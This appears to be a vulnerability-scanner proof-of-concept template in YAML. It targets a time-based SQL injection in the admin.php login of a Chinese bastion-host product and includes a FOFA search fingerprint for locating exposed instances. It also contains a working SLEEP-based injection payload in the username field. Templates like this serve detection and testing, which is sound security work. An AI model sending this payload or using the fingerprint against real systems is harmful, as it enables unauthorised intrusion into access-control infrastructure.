id: poc-yaml-zyql-bastion-host-admin-php-sqli
info:
  name: 中远麒麟堡垒机 admin.php SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 中远麒麟堡垒机
  fofa: body="url=\"admin.php?controller=admin_index&action=get_user_login_fristauth&username="
variables:
  t1: random_int(5,10)
  t2: t1 + 1
requests:
- method: POST
  path: /admin.php?controller=admin_commonuser
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: username=admin' AND (SELECT 12 FROM (SELECT(SLEEP({{.t1}})))ptGN) AND 'AAdm'='AAdm
  expression: 'status_code == 200 &&

    contains(body,"username and password does not match!") &&

    duration > t1 &&

    duration < t2

    '
transport: http
